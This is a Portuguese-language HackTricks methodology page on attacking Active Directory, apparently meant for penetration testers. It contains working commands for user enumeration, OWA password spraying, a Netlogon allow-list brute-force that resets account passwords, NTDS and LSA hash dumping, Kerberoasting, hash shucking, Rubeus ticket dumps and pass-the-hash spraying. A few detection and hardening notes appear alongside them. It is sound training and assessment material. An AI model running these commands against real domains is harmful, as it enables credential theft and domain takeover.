# Metodologia do Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Visão geral básica

O **Active Directory** funciona como uma tecnologia fundamental, permitindo que **administradores de rede** criem e gerenciem eficientemente **domínios**, **usuários** e **objetos** dentro de uma rede. Ele foi projetado para ser escalável, facilitando a organização de um grande número de usuários em **grupos** e **subgrupos** gerenciáveis, enquanto controla **direitos de acesso** em vários níveis.

A estrutura do **Active Directory** é composta por três camadas principais: **domínios**, **árvores** e **florestas**. Um **domínio** engloba uma coleção de objetos, como **usuários** ou **dispositivos**, que compartilham um banco de dados comum. **Árvores** são grupos desses domínios vinculados por uma estrutura compartilhada, e uma **floresta** representa a coleção de várias árvores, interconectadas por meio de **relações de confiança**, formando a camada superior da estrutura organizacional. **Direitos de acesso** e **comunicação** específicos podem ser designados em cada um desses níveis.

Os principais conceitos do **Active Directory** incluem:

1. **Directory** – Armazena todas as informações relacionadas aos objetos do Active Directory.
2. **Object** – Representa entidades dentro do diretório, incluindo **usuários**, **grupos** ou **pastas compartilhadas**.
3. **Domain** – Funciona como um contêiner para objetos do diretório, com a capacidade de coexistirem vários domínios dentro de uma **forest**, cada um mantendo sua própria coleção de objetos.
4. **Tree** – Um agrupamento de domínios que compartilham um domínio raiz comum.
5. **Forest** – O nível máximo da estrutura organizacional no Active Directory, composto por várias árvores com **relações de confiança** entre elas.

O **Active Directory Domain Services (AD DS)** engloba uma série de serviços essenciais para o gerenciamento e a comunicação centralizados dentro de uma rede. Esses serviços incluem:

1. **Domain Services** – Centraliza o armazenamento de dados e gerencia as interações entre **usuários** e **domínios**, incluindo funcionalidades de **autenticação** e **pesquisa**.
2. **Certificate Services** – Supervisiona a criação, distribuição e gerenciamento de **certificados digitais** seguros.
3. **Lightweight Directory Services** – Oferece suporte a aplicações habilitadas para diretórios por meio do **protocolo LDAP**.
4. **Directory Federation Services** – Fornece recursos de **single sign-on** para autenticar usuários em várias aplicações web durante uma única sessão.
5. **Rights Management** – Ajuda a proteger material protegido por direitos autorais, regulando sua distribuição e utilização não autorizadas.
6. **DNS Service** – Essencial para a resolução de **nomes de domínio**.

Para obter uma explicação mais detalhada, consulte: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Para aprender como **atacar um AD**, você precisa **entender** muito bem o **processo de autenticação do Kerberos**.\
[**Leia esta página se você ainda não sabe como ele funciona.**](kerberos-authentication.md)

## Cheat Sheet

Você pode consultar [https://wadcoms.github.io/](https://wadcoms.github.io) para obter uma visão rápida dos comandos que pode executar para enumerar/explorar um AD.

> [!WARNING]
> A comunicação Kerberos normalmente **exige um nome de domínio totalmente qualificado (FQDN)** para que o cliente possa obter um ticket para o SPN correto. Acessar uma máquina por endereço IP geralmente faz com que seja utilizado NTLM em vez de Kerberos.

## Reconhecimento do Active Directory (sem creds/sessões)

Se você tiver apenas acesso a um ambiente AD, mas não possuir credenciais/sessões, poderá:

- **Pentest da rede:**
- Fazer um scan da rede, encontrar máquinas e portas abertas e tentar **explorar vulnerabilidades** ou **extrair credenciais** delas (por exemplo, [impressoras podem ser alvos muito interessantes](ad-information-in-printers.md)).
- Enumerar o DNS pode fornecer informações sobre servidores importantes no domínio, como web, impressoras, shares, vpn, mídia etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Consulte a [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) geral para obter mais informações sobre como fazer isso.
- **Verificar o acesso null e Guest nos serviços smb** (isso não funcionará em versões modernas do Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Um guia mais detalhado sobre como enumerar um servidor SMB pode ser encontrado aqui:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerar Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Um guia mais detalhado sobre como enumerar LDAP pode ser encontrado aqui (preste **especial atenção ao acesso anônimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Envenenar a rede**
- Coletar credenciais [**personificando serviços com Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Acessar o host [**abusando do relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Coletar credenciais **expondo** [**serviços UPnP falsos com evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extrair nomes de usuário/nomes de documentos internos, redes sociais e serviços (principalmente web) dentro dos ambientes do domínio, bem como de fontes publicamente disponíveis.
- Se você encontrar os nomes completos dos funcionários da empresa, poderá tentar diferentes **convenções de nomes de usuário do AD (**[**leia isto**](https://activedirectorypro.com/active-directory-user-naming-convention/)). As convenções mais comuns são: _NameSurname_, _Name.Surname_, _NamSur_ (3 letras de cada), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _letras aleatórias e 3 números aleatórios_ (abc123).
- Ferramentas:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeração de usuários

- **Enumeração SMB/LDAP anônima:** Consulte as páginas de [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Enumeração com Kerbrute**: Quando um **nome de usuário inválido é solicitado**, o servidor responderá usando o código de **erro do Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, permitindo determinar que o nome de usuário era inválido. **Nomes de usuário válidos** gerarão o **TGT** em uma resposta AS-REP ou o erro _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando que o usuário precisa realizar a pré-autenticação.
- **Sem autenticação contra MS-NRPC**: Usar auth-level = 1 (sem autenticação) contra a interface MS-NRPC (Netlogon) nos controladores de domínio. O método chama a função `DsrGetDcNameEx2` após fazer o binding da interface MS-NRPC para verificar se o usuário ou computador existe sem quaisquer credenciais. A ferramenta [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa esse tipo de enumeração. A pesquisa pode ser encontrada [aqui](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **Servidor OWA (Outlook Web Access)**

Se você encontrou um desses servidores na rede, também pode realizar **enumeração de usuários nele**. Por exemplo, você poderia usar a ferramenta [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Você pode encontrar listas de nomes de usuário [**neste repositório do GitHub**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) e neste outro ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> No entanto, você deve ter os **nomes das pessoas que trabalham na empresa** obtidos na etapa de recon que deveria ter realizado antes disso. Com o nome e o sobrenome, você poderia usar o script [**namemash.py**](https://gist.github.com/superkojiman/11076951) para gerar possíveis nomes de usuário válidos.

### Abuso da allow-list de canais vulneráveis do Netlogon (Onelogon)

Mesmo após o **Zerologon** ser corrigido no DC, as contas explicitamente incluídas na allow-list ainda podem ficar expostas ao comportamento **legacy/vulnerable Netlogon secure-channel**. A configuração de risco é a GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ou o valor de registro correspondente **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Esse valor é um **descritor de segurança SDDL** (consulte [Security Descriptors](security-descriptors.md)). Qualquer conta ou grupo ao qual seja concedida a ACE relevante na DACL poderá ser alvo. Por exemplo, `O:BAG:BAD:(A;;RC;;;WD)` efetivamente inclui **Everyone** na allow-list.

Fluxo de trabalho prático:

1. **Identifique os principals incluídos na allow-list** verificando tanto o **SYSVOL/GPO** quanto o registro ativo do **DC**.
2. **Resolva os SIDs** encontrados no SDDL para usuários/computadores reais do AD e priorize **contas de máquina de DC**, **contas de trust** e outras máquinas privilegiadas.
3. Tente repetidamente a **autenticação MS-NRPC / Netlogon** usando a conta incluída na allow-list.
4. Após um palpite bem-sucedido, abuse do **Netlogon password-setting** para redefinir a senha da conta-alvo (o PoC público a define como uma string vazia).<sup>[[9]](#references)[[10]](#references)</sup>

Exemplos rápidos de triagem / laboratório do artefato público:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notas:

- O **scanner** é útil porque a allow-list efetiva pode existir no **SYSVOL**, no **registry** ou em ambos.
- O próprio caminho de exploit é importante porque **não exige privilégios de Domain Admin** depois que uma conta vulnerável foi identificada.
- Comprometer uma **conta de máquina do Domain Controller**, como `DC$`, é especialmente perigoso, pois redefinir essa senha pode habilitar diretamente caminhos mais amplos de **AD takeover**.
- A viabilidade de **brute force** depende do modo: o artefato público descreve uma abordagem meet-in-the-middle, um **brute force de 24 bits** quando outro computador está disponível e variantes de **32 bits** mais lentas.

Notas de detecção / hardening:

- Audite a política da allow-list e remova tudo, exceto exceções temporárias de compatibilidade explicitamente necessárias.
- Monitore os eventos **5827/5828/5829/5830/5831** do **System** nos DCs para detectar conexões Netlogon vulneráveis que foram negadas, descobertas ou explicitamente permitidas pela política.
- Trate as contas em `VulnerableChannelAllowList` como **de alto risco** até que a dependência legada seja removida.

### Conhecendo um ou vários nomes de usuário

Certo, então você sabe que já tem um nome de usuário válido, mas nenhuma senha... Então tente:

- [**ASREPRoast**](asreproast.md): Se um usuário **não tiver** o atributo _DONT_REQ_PREAUTH_, você poderá **solicitar uma mensagem AS_REP** para esse usuário, que conterá alguns dados criptografados por uma derivação da senha do usuário.
- [**Password Spraying**](password-spraying.md): Vamos tentar as **senhas mais comuns** com cada um dos usuários descobertos; talvez algum usuário esteja usando uma senha fraca (tenha em mente a política de senhas!).
- Observe que você também pode fazer **spraying em servidores OWA** para tentar obter acesso aos servidores de e-mail dos usuários.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Talvez seja possível **obter** alguns **hashes** de challenge fazendo **poisoning** em alguns protocolos da **rede**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

A enumeração do Active Directory fornece nomes de usuário, identificadores de e-mail e padrões de nomenclatura, hosts candidatos e serviços que podem ser coagidos a autenticar. Use esse contexto para identificar [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) viáveis do NTLM e possíveis caminhos para entrar no ambiente de AD.

### Recon e verificações da postura de relay orientados por workspaces do NetExec

- Use **`nxcdb workspaces`** para manter o estado do recon de AD por engagement: `workspace create <name>` gera bancos de dados SQLite por protocolo em `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Alterne as visualizações com `proto smb|mssql|winrm` e liste os secrets coletados com `creds`. Remova manualmente os dados sensíveis ao terminar: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- A descoberta rápida de sub-redes com **`netexec smb <cidr>`** mostra **domínio**, **build do SO**, **requisitos de assinatura SMB** e **Null Auth**. Membros que exibem `(signing:False)` são **suscetíveis a relay**, enquanto os DCs normalmente exigem assinatura.
- Gere **hostnames em /etc/hosts** diretamente a partir da saída do NetExec para facilitar o targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Quando o **SMB relay para o DC é bloqueado** pela exigência de signing, ainda verifique a configuração do **LDAP**: `netexec ldap <dc>` destaca `(signing:None)` / channel binding fraco. Um DC com SMB signing obrigatório, mas com LDAP signing desabilitado, continua sendo um alvo viável de **relay-to-LDAP** para abusos como **SPN-less RBCD**.

### Leaks de credenciais de impressoras no lado do cliente → validação em massa de credenciais do domínio

- As interfaces web de impressoras às vezes **incorporam senhas de admin mascaradas no HTML**. Ver o código-fonte/devtools pode revelar o texto simples (por exemplo, `<input value="<password>">`), permitindo acesso com Basic-auth a repositórios de digitalização/impressão.
- Os trabalhos de impressão recuperados podem conter **documentos de onboarding em texto simples** com senhas por usuário. Mantenha as associações alinhadas durante os testes:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Se você puder **acessar outros PCs ou shares** com o **null ou guest user**, poderá **colocar arquivos** (como um arquivo SCF) que, se forem acessados de alguma forma, irão **triggerar uma autenticação NTLM contra você**, permitindo **roubar** o **desafio NTLM** para crackeá-lo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

O **hash shucking** trata cada hash NT que você já possui como uma senha candidata para outros formatos mais lentos cujo material de chave é derivado diretamente do hash NT. Em vez de fazer brute-force de longas passphrases em tickets Kerberos RC4, desafios NetNTLM ou credenciais em cache, você fornece os hashes NT aos modos NT-candidate do Hashcat e permite que ele valide a reutilização da senha sem nunca descobrir o plaintext. Isso é especialmente eficaz após um domain compromise, quando você pode coletar milhares de hashes NT atuais e históricos.<sup>[[5]](#references)</sup>

Use shucking quando:

- Você tiver um corpus de NT obtido por DCSync, dumps de SAM/SECURITY ou credential vaults e precisar testar reutilização em outros domains/forests.
- Você capturar material Kerberos baseado em RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), respostas NetNTLM ou blobs DCC/DCC2.
- Você quiser comprovar rapidamente a reutilização de passphrases longas e impossíveis de crackear e fazer pivot imediatamente via Pass-the-Hash.

A técnica **não funciona** contra tipos de criptografia cujas chaves não sejam o hash NT (por exemplo, Kerberos etype 17/18 AES). Se um domain impuser AES-only, você deverá voltar aos modos regulares de password.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` com histórico para obter o maior conjunto possível de hashes NT (e seus valores anteriores):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

As entradas de histórico ampliam significativamente o conjunto de candidatos, pois a Microsoft pode armazenar até 24 hashes anteriores por conta. Para conhecer outras formas de coletar secrets do NTDS, veja:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ou Mimikatz `lsadump::sam /patch`) extrai dados locais do SAM/SECURITY e logons de domains em cache (DCC/DCC2). Remova duplicatas e acrescente esses hashes à mesma lista `nt_candidates.txt`.
- **Track metadata** – Mantenha o username/domain que produziu cada hash (mesmo que a wordlist contenha apenas hexadecimal). Hashes correspondentes informam imediatamente qual principal está reutilizando uma senha assim que o Hashcat exibir o candidato vencedor.
- Prefira candidatos do mesmo forest ou de um forest confiável; isso maximiza a chance de sobreposição ao fazer shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Observações:

- As entradas NT-candidate **devem permanecer como hashes NT brutos de 32 caracteres hexadecimais**. Desative os rule engines (sem `-r` e sem hybrid modes), pois o mangling corrompe o material de chave candidato.
- Esses modos não são inerentemente mais rápidos, mas o keyspace do NTLM (~30.000 MH/s em um M3 Max) é ~100× mais rápido que o Kerberos RC4 (~300 MH/s). Testar uma lista NT selecionada é muito mais barato do que explorar todo o password space no formato lento.
- Sempre execute a **versão mais recente do Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), pois os modos 31500/31600/35300/35400 foram lançados recentemente.<sup>[[7]](#references)</sup>
- Atualmente não existe um modo NT para AS-REQ Pre-Auth, e os etypes AES (19600/19700) exigem a senha em plaintext, pois suas chaves são derivadas via PBKDF2 de senhas UTF-16LE, e não de hashes NT brutos.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture um TGS RC4 para um SPN-alvo com um usuário de baixos privilégios (consulte a página sobre Kerberoast para obter detalhes):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Faça shuck do ticket com sua lista NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

O Hashcat deriva a chave RC4 de cada candidato NT e valida o blob `$krb5tgs$23$...`. Uma correspondência confirma que a service account usa um dos seus hashes NT existentes.

3. Faça pivot imediatamente via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Opcionalmente, você poderá recuperar o plaintext mais tarde com `hashcat -m 1000 <matched_hash> wordlists/`, se necessário.

#### Example – Cached credentials (mode 31600)

1. Faça dump dos logons em cache de uma workstation comprometida:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copie a linha DCC2 do usuário do domain relevante para `dcc2_highpriv.txt` e faça shuck dela:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Uma correspondência bem-sucedida fornece o hash NT já conhecido na sua lista, comprovando que o usuário em cache está reutilizando uma senha. Use-o diretamente para PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ou faça brute-force em fast NTLM mode para recuperar a string.

O mesmo workflow se aplica a challenge-responses NetNTLM (`-m 27000/27100`) e DCC (`-m 31500`). Depois que uma correspondência for identificada, você poderá iniciar relay, SMB/WMI/WinRM PtH ou fazer re-crack do hash NT com masks/rules offline.



## Enumerating Active Directory WITH credentials/session

Nesta fase, você precisa ter **comprometido as credenciais ou uma sessão de uma conta de domain válida**. Se você tiver credenciais válidas ou um shell como usuário de um domain, **deve lembrar que as opções apresentadas anteriormente continuam sendo opções para comprometer outros usuários**.

Antes de iniciar a enumeração autenticada, entenda o **problema do double-hop do Kerberos**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Comprometer uma conta é um **passo importante para avaliar o domain**, pois permite fazer **enumeração autenticada do Active Directory**:

Com relação ao [**ASREPRoast**](asreproast.md), agora você pode encontrar todos os usuários potencialmente vulneráveis; e, com relação ao [**Password Spraying**](password-spraying.md), pode obter uma **lista de todos os usernames** e tentar a senha da conta comprometida, senhas vazias e novas senhas promissoras.

- Você pode usar o [**CMD para realizar um recon básico**](../basic-cmd-for-pentesters.md#domain-info)
- Você também pode usar [**powershell para recon**](../basic-powershell-for-pentesters/index.html), o que será mais stealthy
- Você também pode [**usar o powerview**](../basic-powershell-for-pentesters/powerview.md) para extrair informações mais detalhadas
- Outra ferramenta incrível para recon em um active directory é o [**BloodHound**](bloodhound.md). Ele **não é muito stealthy** (dependendo dos métodos de coleta usados), mas, **se isso não for uma preocupação**, você definitivamente deve experimentá-lo. Descubra onde os usuários podem fazer RDP, encontre caminhos para outros groups etc.
- **Outras ferramentas automatizadas de enumeração de AD são:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Registros DNS do AD**](ad-dns-records.md), pois eles podem conter informações interessantes.
- Uma **ferramenta com GUI** que você pode usar para enumerar o directory é o **AdExplorer.exe**, da suíte **SysInternal**.
- Você também pode pesquisar no banco de dados LDAP com **ldapsearch** para procurar credenciais nos campos _userPassword_ e _unixUserPassword_, ou até mesmo em _Description_. Consulte [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) para conhecer outros métodos.
- Se estiver usando **Linux**, você também poderá enumerar o domain usando [**pywerview**](https://github.com/the-useless-one/pywerview).
- Você também pode tentar ferramentas automatizadas como:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extraindo todos os usuários do domain**

É muito fácil obter todos os usernames do domain no Windows (`net user /domain`, `Get-DomainUser` ou `wmic useraccount get name,sid`). No Linux, você pode usar: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`

> Mesmo que esta seção de Enumeration pareça pequena, ela é a parte mais importante de todas. Acesse os links (principalmente os de cmd, powershell, powerview e BloodHound), aprenda a enumerar um domain e pratique até se sentir confortável. Durante um assessment, este será o momento fundamental para encontrar seu caminho até DA ou decidir que nada pode ser feito.

### Kerberoast

Kerberoasting envolve obter **tickets TGS** usados por services associados a contas de usuários e crackear sua criptografia — baseada nas senhas dos usuários — **offline**.

Mais informações sobre isso em:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connection (RDP, SSH, FTP, Win-RM, etc.)

Depois de obter algumas credenciais, você pode verificar se tem acesso a alguma **máquina**. Para isso, pode usar o **CrackMapExec** para tentar conectar-se a vários servers com diferentes protocolos, de acordo com os seus port scans.

### Local Privilege Escalation

Se você tiver comprometido credenciais ou uma sessão como usuário comum de um domain e puder acessar **qualquer máquina no domain**, procure um caminho para **escalate privileges localmente e coletar credenciais**. Privilégios de administrador local podem permitir que você faça **dump dos hashes de outros usuários** a partir da memória (LSASS) e do armazenamento local (SAM).

Existe uma página completa neste livro sobre [**local privilege escalation no Windows**](../windows-local-privilege-escalation/index.html) e um [**checklist**](../checklist-windows-privilege-escalation.md). Além disso, não se esqueça de usar o [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

É muito **improvável** que você encontre **tickets** no usuário atual que **lhe deem permissão para acessar** recursos inesperados, mas você pode verificar:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Com credenciais de domínio ou uma sessão de usuário, revisite os [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM: técnicas de enumeração autenticada e coerção podem expor caminhos de relay que estavam indisponíveis durante o reconhecimento não autenticado.

### Procurar Creds em Compartilhamentos de Computadores | Compartilhamentos SMB

Agora que você tem algumas credenciais básicas, deve verificar se consegue **encontrar** algum **arquivo interessante compartilhado dentro do AD**. Você poderia fazer isso manualmente, mas é uma tarefa muito entediante e repetitiva (principalmente se encontrar centenas de documentos que precisa verificar).

[**Siga este link para conhecer as ferramentas que você pode usar.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Roubar NTLM Creds

Se você consegue **acessar outros PCs ou compartilhamentos**, pode **colocar arquivos** (como um arquivo SCF) que, se forem acessados de alguma forma, **dispararão uma autenticação NTLM contra você**, permitindo **roubar** o **desafio NTLM** para quebrá-lo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Essa vulnerabilidade permitia que qualquer usuário autenticado **comprometesse o controlador de domínio**.


{{#ref}}
printnightmare.md
{{#endref}}

## Escalação de privilégios no Active Directory COM credenciais/sessão privilegiadas

**Para as técnicas a seguir, um usuário de domínio comum não é suficiente; você precisa de privilégios/credenciais especiais para realizar esses ataques.**

### Extração de hashes

Esperamos que você tenha conseguido **comprometer** alguma conta de **administrador local** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), incluindo relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalando privilégios localmente](../windows-local-privilege-escalation/index.html).\
Então, é hora de extrair todos os hashes da memória e localmente.\
[**Leia esta página sobre as diferentes formas de obter os hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Depois que você obtiver o hash de um usuário**, poderá usá-lo para **personificá-lo**.\
Você precisa usar alguma **ferramenta** que **realize** a **autenticação NTLM usando** esse **hash**, **ou** pode criar um novo **sessionlogon** e **injetar** esse **hash** no **LSASS**, para que, quando qualquer **autenticação NTLM for realizada**, esse **hash seja usado**. A última opção é o que o mimikatz faz.\
[**Leia esta página para obter mais informações.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Este ataque tem como objetivo **usar o hash NTLM do usuário para solicitar tickets Kerberos**, como alternativa ao Pass The Hash comum sobre o protocolo NTLM. Portanto, isso pode ser especialmente **útil em redes nas quais o protocolo NTLM está desabilitado** e somente o **Kerberos é permitido** como protocolo de autenticação.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

No método de ataque **Pass The Ticket (PTT)**, os atacantes **roubam o ticket de autenticação de um usuário** em vez dos valores de senha ou hash. Esse ticket roubado é então usado para **personificar o usuário**, obtendo acesso não autorizado a recursos e serviços dentro de uma rede.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Reutilização de Credenciais

Se você tiver o **hash** ou a **senha** de um **administrador local**, deverá tentar **fazer login localmente** em outros **PCs** usando-o.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Observe que isso é bastante **ruidoso** e o **LAPS** o **mitigaria**.

### Abuso de MSSQL e Trusted Links

Se um usuário tiver privilégios para **acessar instâncias MSSQL**, ele poderá usá-las para **executar comandos** no host MSSQL (se estiver sendo executado como SA), **roubar** o **hash** NetNTLM ou até mesmo realizar um **ataque** de **relay**.\
Se uma instância MSSQL for considerada confiável por meio de um link de banco de dados por outra instância, um usuário com privilégios sobre o banco de dados vinculado poderá **usar a relação de confiança para executar consultas na outra instância**. Essas relações de confiança podem ser encadeadas e, eventualmente, alcançar um banco de dados configurado incorretamente, onde o usuário poderá executar comandos.\
**Os links entre bancos de dados funcionam até mesmo entre forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuso de plataformas de ativos/deployment de TI

Suites de inventário e deployment de terceiros frequentemente expõem caminhos poderosos para credenciais e execução de código. Consulte:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Se você encontrar qualquer objeto Computer com o atributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) e tiver privilégios de domínio no computador, poderá extrair TGTs da memória de todos os usuários que fizerem login no computador.\
